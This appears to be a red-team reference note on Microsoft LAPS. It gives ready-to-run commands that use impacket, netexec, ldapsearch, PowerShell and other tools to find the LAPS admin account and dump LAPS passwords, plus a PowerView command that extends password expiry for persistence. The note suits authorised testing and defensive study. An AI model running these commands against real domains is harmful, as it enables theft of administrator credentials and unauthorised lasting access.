---
title: LAPS
---

Local Administrator Password Solution assigns random passwords to the local administrator account on domain-joined devices ([source](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)).
With LAPSv1 the password is stored in the `ms-MCS-AdmPwd` attribute on the computer object.
With LAPSv2 the `msLAPS-EncryptedPassword` or `msLAPS-Password` attribute is used.

Check if the current computer has LAPSv1 installed.

~~~ bat
dir C:\Program Files\LAPS\CSE\AdmPwd.dll
~~~

Get LAPS username from registry by reading `HKLM\Software\Policies\Microsoft Services\AdmPwd\AdminAccountName`.

Get LAPS username from GPO ([source](https://training.zeropointsecurity.co.uk/courses/take/red-team-ops/texts/38501018-local-administrator-password-solution)).

=== "PowerView + [GPRegistryPolicyParser](https://github.com/PowerShell/GPRegistryPolicyParser)"
    ~~~
    PS > Get-DomainGPO | ? { $_.DisplayName -like '*laps*' } | select DisplayName, Name, GPCFileSysPath
    PS > cp \\dc01.corp.local\SysVol\corp.local\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}\Machine\Registry.pol .
    PS > Parse-PolFile .\Registry.pol
    ...
    KeyName     : Software\Policies\Microsoft Services\AdmPwd
    ValueName   : AdminAccountName
    ValueType   : REG_SZ
    ValueLength : 20
    ValueData   : LapsAdmin
    ...
    ~~~

Dump all accessible LAPS passwords.

=== "[[notes/tools/impacket]]"
    Requires [PR 1673](https://github.com/fortra/impacket/pull/1673).

    ~~~ bash
    impacket-readlaps corp.local/jdoe:'passw0rd'
    ~~~

=== "[GetLAPSPassword](https://github.com/dru1d-foofus/GetLAPSPassword)"
    ~~~ bash
    python3 ./GetLAPSPassword.py -debug -computer ws01 corp.local/jdoe:'passw0rd'
    ~~~

=== "[[notes/tools/netexec]]"
    ~~~ bash
    netexec ldap dc01.corp.local -d corp.local -u jdoe -p 'passw0rd' -M laps
    ~~~

=== "ldapsearch"
    ~~~ bash
    ldapsearch -o ldif-wrap=no -H ldaps://dc01.corp.local -D jdoe@corp.local -w 'passw0rd' -b dc=corp,dc=local '(&(objectCategory=computer)(ms-MCS-AdmPwd=*))'
    ~~~

=== "[[notes/tools/powershell-rsat]]"
    ~~~ powershell
    Get-ADComputer -Server dc01.corp.local -Identity ws01 -Properties ms-MCS-AdmPwd,ms-Mcs-AdmPwdExpirationTime
    Get-ADObject -LdapFilter '(ms-MCS-AdmPwd=*)' -Properties ms-MCS-AdmPwd,ms-Mcs-AdmPwdExpirationTime | %{ $_.DistinguishedName, $_['ms-MCS-AdmPwd'] }
    ~~~

If *Do not allow password expiration time longer than required by policy* aka `PwdExpirationProtectionEnabled` is not enabled and you control a computer you can set the expiration of the LAPS password far into the future ([source](https://training.zeropointsecurity.co.uk/courses/take/red-team-ops/texts/38528164-password-expiration-protection)).

=== "PowerView"
    ~~~ powershell
    Set-DomainObject -Identity ws01 -Set @{'ms-Mcs-AdmPwdExpirationTime'='136257686710000000'} -Verbose
    ~~~

    The timestamp can be calculated with [epochconverter.com](https://www.epochconverter.com/ldap).

Other tools:

- [LAPSDumper](https://github.com/n00py/lapsdumper), doesn't support Kerberos

Untested tools:

- [LAPSv2Decrypt BOF](https://github.com/xpn/RandomTSScripts/tree/master/lapsv2decrypt/bof)
- [lapsv2_decryptor.py](https://gist.github.com/zblurx/009633b2db25918bdbbff664a01508fc), LAPSv2 dumper, also see Impacket [PR 1556](https://github.com/fortra/impacket/pull/1556)
- [LAPSDecrypt.cs](https://gist.github.com/xpn/23dc5b6c260a7571763ca8ca745c32f4), decryptor for LAPSv2 passwords

References:

- [LAPS 2.0 Internals](http://web.archive.org/web/20230814075010/https://blog.xpnsec.com/lapsv2-internals/)
- [A Hitch-hacker's Guide to DACL-Based Detections (Part 1B)](http://web.archive.org/web/20231015122711/https://trustedsec.com/blog/a-hitch-hackers-guide-to-dacl-based-detections-part-1b)
